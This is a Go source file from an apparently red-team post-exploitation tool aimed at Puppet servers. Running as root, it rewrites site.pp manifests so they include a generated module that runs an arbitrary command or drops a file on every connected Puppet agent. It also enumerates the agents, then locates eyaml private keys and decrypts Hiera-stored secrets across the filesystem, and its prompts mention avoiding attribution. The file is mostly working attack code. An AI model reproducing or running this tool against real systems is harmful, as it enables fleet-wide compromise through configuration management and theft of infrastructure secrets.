package main

// Copyright 2019 Jayson Grace. All rights reserved
// Use of this source code is governed by a MIT-style
// license that can be found in the LICENSE file.

import (
	"encoding/json"
	"flag"
	"fmt"
	"github.com/fatih/color"
	"github.com/gobuffalo/packr/v2"
	"github.com/l50/goutils"
	"github.com/master-of-servers/mose/pkg/moseutils"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"text/template"
)

type eyamlKeys struct {
	publicKey  string
	privateKey string
}

type Command struct {
	ClassName string
	CmdName   string
	Cmd       string
	FileName  string
	FilePath  string
}

var (
	a               = CreateAgent()
	cleanup         bool
	bdCmd           = a.BdCmd
	msg             = color.Green
	osTarget        = a.OsTarget
	moduleName      = a.PayloadName
	uploadFileName  = a.FileName
	uploadFilePath  = a.FilePath
	cleanupFile     = a.CleanupFile
	puppetBackupLoc = a.PuppetBackupLoc
)

func init() {
	flag.BoolVar(&cleanup, "c", false, "Activate cleanup using the file location in settings.json")
}

func cleanAgentOutput(cmdOut string) []string {
	re := regexp.MustCompile(`(\w+\.\w+\.\w+)`)
	newout := moseutils.SliceUniqMap(re.FindAllString(cmdOut, -1))
	return newout
}

func getAgents() []string {
	cmds := []string{"puppet cert list -a", "puppetserver ca list --all"}
	cmdOut := ""
	var err error

	// Find the right command to run
	for _, cmd := range cmds {
		cmdArr := strings.Fields(cmd)
		cmdOut, err = utils.RunCommand(cmdArr[0], cmdArr[1:]...)
		if err == nil {
			log.Printf("Running %v", cmd)
			break
		}
		log.Printf("%v not working on this system", cmd)
	}

	agents := cleanAgentOutput(cmdOut)
	if err != nil {
		log.Fatalln("This system is not a Puppet Server, exiting.")
	} else if len(agents) == 1 && strings.Contains(agents[0], moseutils.GetHostname()) {
		log.Fatalln("The Puppet Server is the only agent, and you've pwned it. Exiting.")
	} else if strings.Contains(cmdOut, "No certificates to list") {
		log.Fatalln("There are no agents configured with this Puppet Server, exiting.")
	}

	return agents
}

// getModules will get existing modules on the puppet server and output them
func getModules(moduleLoc string) []string {
	var o []string
	// Because the format of the data may vary, we opt to use maps
	var jsonOut map[string]interface{}

	cmdOut, err := utils.RunCommand("puppet", "module", "list", "--modulepath", moduleLoc, "--render-as", "json")
	if err != nil {
		log.Println("Error: Unable to get existing modules")
	}
	err = json.Unmarshal([]byte(cmdOut), &jsonOut)
	if err != nil {
		log.Fatalf("Error: Unable to unmarshal %v", jsonOut)
	}
	modules := jsonOut["modules_by_path"].(map[string]interface{})
	for key, value := range modules {
		switch s := value.(type) {
		default:
		case []interface{}:
			for _, str := range s {
				o = append(o, fmt.Sprintf("%v:%v", key, str))
			}
		}
	}
	return o
}

func getExistingManifests() []string {
	var manifestLocs []string
	fileList, _ := moseutils.GetFileAndDirList([]string{"/etc", "/opt"})
	for _, file := range fileList {
		if strings.Contains(file, "site.pp") && !strings.Contains(file, "~") &&
			!strings.Contains(file, ".bak") && !strings.Contains(file, "#") {
			manifestLocs = append(manifestLocs, file)
		}
	}
	if len(manifestLocs) == 0 {
		log.Fatalln("Unable to locate a manifest file to backdoor, exiting.")
	}
	return manifestLocs
}

// backupManifest will create a backup of the existing manifest
func backupManifest(manifestLoc string) {
	path := manifestLoc
	if puppetBackupLoc != "" {
		path = filepath.Join(puppetBackupLoc, filepath.Base(manifestLoc))
	}
	if !moseutils.FileExists(path + ".bak.mose") {
		moseutils.CpFile(manifestLoc, path+".bak.mose")
		return
	}
	log.Printf("Backup of the manifest (%v.bak.mose) already exists.", manifestLoc)
	return
}

func backdoorManifest(manifestLoc string) {
	// TODO: Offer ability to review nodes here and choose which ones to target
	insertString := "  include " + moduleName + "\n"
	nodeLines := regexp.MustCompile(`(?sm)}\s*?node\b`)
	eof := regexp.MustCompile(`}\s*?$`)
	comments := regexp.MustCompile(`#.*`)

	fileContent, err := ioutil.ReadFile(manifestLoc)
	if err != nil {
		log.Println(err)
		log.Fatalf("Failed to backdoor the manifest located at %s, exiting.", manifestLoc)
	}

	content := fmt.Sprint(comments.ReplaceAllString(string(fileContent), ""))
	content = fmt.Sprint(eof.ReplaceAllString(content, insertString+"}\n"))
	content = fmt.Sprint(nodeLines.ReplaceAllString(content, insertString+"}\nnode"))

	err = ioutil.WriteFile(manifestLoc, []byte(content), 0644)
	if err != nil {
		log.Fatalf("Failed to backdoor the manifest located at %s, exiting.", manifestLoc)
	}
}

func getPuppetCodeLoc(manifestLoc string) string {
	d, _ := filepath.Split(manifestLoc)
	return filepath.Clean(filepath.Join(d, "../"))
}

func generateModule(moduleManifest string, cmd string) bool {
	puppetCommand := Command{
		ClassName: moduleName,
		CmdName:   "cmd",
		Cmd:       bdCmd,
		FileName:  uploadFileName,
		FilePath:  uploadFilePath,
	}

	box := packr.New("Puppet", "../../../templates/puppet")

	s, err := box.FindString("puppetModule.tmpl")
	if uploadFileName != "" {
		s, err = box.FindString("puppetFileUploadModule.tmpl")
	}

	if err != nil {
		log.Fatal("Parse: ", err)
	}

	t, err := template.New("puppetModule").Parse(s)

	if err != nil {
		log.Fatal("Parse: ", err)
	}

	f, err := os.Create(moduleManifest)

	if err != nil {
		log.Fatalln(err)
	}

	err = t.Execute(f, puppetCommand)

	if err != nil {
		log.Fatal("Execute: ", err)
	}

	f.Close()

	return true
}

func createModule(manifestLoc string, moduleName string, cmd string) {
	puppetCodeLoc := getPuppetCodeLoc(manifestLoc)
	moduleLoc := filepath.Join(puppetCodeLoc, "modules", moduleName)
	moduleFolders := []string{filepath.Join(moduleLoc, "manifests")}
	moduleManifest := filepath.Join(moduleLoc, "manifests", "init.pp")
	if moseutils.CreateFolders(moduleFolders) && generateModule(moduleManifest, cmd) {
		msg("Successfully created the %s module at %s", moduleName, moduleManifest)
		msg("Adding folder %s to cleanup file", moduleFolders)
		// Track the folders for clean up purposes
		moseutils.TrackChanges(cleanupFile, moduleLoc)
		if uploadFileName != "" {
			moduleFiles := filepath.Join(moduleLoc, "files")

			moseutils.CreateFolders([]string{moduleFiles})
			log.Printf("Copying  %s to module location %s", uploadFileName, moduleFiles)
			moseutils.CpFile(uploadFileName, filepath.Join(moduleFiles, filepath.Base(uploadFileName)))
			if err := os.Chmod(filepath.Join(moduleFiles, filepath.Base(uploadFileName)), 0644); err != nil {
				log.Fatal(err)
			}
			log.Printf("Successfully copied and chmod file %s", filepath.Join(moduleFiles, filepath.Base(uploadFileName)))
		}
	} else {
		log.Fatalf("Failed to create %s module", moduleName)
	}
}

func getSecretKeys() map[string]*eyamlKeys {
	keys := make(map[string]*eyamlKeys)
	keyFiles, _ := moseutils.FindFiles([]string{"/etc/puppetlabs", "/etc/puppet", "/root", "/etc/eyaml"}, []string{".pem"}, []string{}, []string{})
	if len(keyFiles) == 0 {
		log.Fatalln("Unable to find any files containing keys used with eyaml, exiting.")
	}
	for _, key := range keyFiles {
		if strings.Contains(key, "pkcs7") {
			d, b := filepath.Split(key)

			if _, ok := keys[d]; !ok {
				keys[d] = &eyamlKeys{}
			}
			k := keys[d]

			if strings.Contains(key, "public") {
				k.publicKey = filepath.Base(key)

			} else if strings.Contains(key, "private") {
				log.Println(key)
				k.privateKey = b
			}
		}
	}
	return keys
}

func findHieraSecrets() {
	// Detect if the eyaml binary exists
	exists, eyamlFile := moseutils.FindBin("eyaml", []string{"/bin", "/home", "/opt", "/root", "/usr"})
	if !exists {
		log.Printf("Eyaml not found, no need to find secrets")
		return
	}
	secretKeys := getSecretKeys()
	puppetFiles, _ := moseutils.FindFiles([]string{"/etc/puppetlabs", "/etc/puppet", "/home", "/opt", "/root", "/var"}, []string{".pp", ".yaml", ".yml"}, []string{}, []string{})

	if len(puppetFiles) == 0 {
		log.Fatalln("Unable to find any chef files, exiting.")
	}
	// Matches for secrets
	reg := regexp.MustCompile(`(?ms)ENC\[.+?\]`)
	var matches []string
	// Translate secrets on the fly
	for _, file := range puppetFiles {
		// Grep for ENC[
		matches = moseutils.GrepFile(file, reg)
		if len(matches) > 0 {
			log.Printf("Found secret(s) in file: %s", file)
			for k := range secretKeys {
				res, err := utils.RunCommand(eyamlFile, "decrypt",
					"--pkcs7-public-key="+k+secretKeys[k].publicKey,
					"--pkcs7-private-key="+k+secretKeys[k].privateKey, "-f", filepath.Join(filepath.Dir(file), filepath.Base(file)))

				if err != nil {
					log.Printf("Error running command: %s decrypt -f %s %v", eyamlFile, file, err)
				}
				if !strings.Contains(res, "bad decrypt") {
					msg("%s", res)
				}
			}
		}
	}
}

func doCleanup(manifestLocs []string) {
	moseutils.TrackChanges(cleanupFile, cleanupFile)
	ans, err := moseutils.AskUserQuestion("Would you like to remove all non Manifest files associated with a previous run?", osTarget)
	if err != nil {
		log.Fatal("Quitting...")
	}
	moseutils.RemoveTracker(cleanupFile, osTarget, ans)

	for _, manifestLoc := range manifestLocs {
		path := manifestLoc
		if puppetBackupLoc != "" {
			path = filepath.Join(puppetBackupLoc, filepath.Base(manifestLoc))
		}

		path = path + ".bak.mose"

		if !moseutils.FileExists(path) {
			log.Printf("Backup file %s does not exist, skipping", path)
			continue
		}
		ans2 := false
		if !ans {
			ans2, err = moseutils.AskUserQuestion(fmt.Sprintf("Overwrite %s with %s", manifestLoc, path), osTarget)
			if err != nil {
				log.Fatal("Quitting...")
			}
		}
		if ans || ans2 {
			moseutils.CpFile(path, manifestLoc)
			os.Remove(path)
		}
	}
	os.Exit(0)

}

func main() {
	flag.Parse()

	// If we're not root, we probably can't backdoor any of the puppet code, so exit
	// This may not always be true as per https://puppet.com/blog/puppet-without-root-a-real-life-example
	// But we are going with it as an assumption based on polling various DevOps engineers and Site Reliability engineers
	utils.CheckRoot()
	manifestLocs := getExistingManifests()

	if cleanup {
		doCleanup(manifestLocs)
	}

	if uploadFilePath != "" {
		moseutils.TrackChanges(cleanupFile, uploadFilePath)
	}

	for _, manifestLoc := range manifestLocs {
		if ans, err := moseutils.AskUserQuestion("Do you want to create a backup of the manifests? This can lead to attribution, but can save your bacon if you screw something up or if you want to be able to automatically clean up.", osTarget); ans && err == nil {
			backupManifest(manifestLoc)
		} else if err != nil {
			log.Fatal("Exiting...")
		}

		msg("Backdooring the %s manifest to run %s on all associated Puppet agents, please wait...", manifestLoc, bdCmd)
		backdoorManifest(manifestLoc)
		createModule(manifestLoc, moduleName, bdCmd)
		modules := getModules(getPuppetCodeLoc(manifestLoc) + "/modules")
		log.Printf("Modules found: %q", modules)
	}
	agents := getAgents()
	log.Printf("Puppet Agents found: %q", agents)

	log.Println("Attempting to find secrets stored with Hiera")
	findHieraSecrets()
}
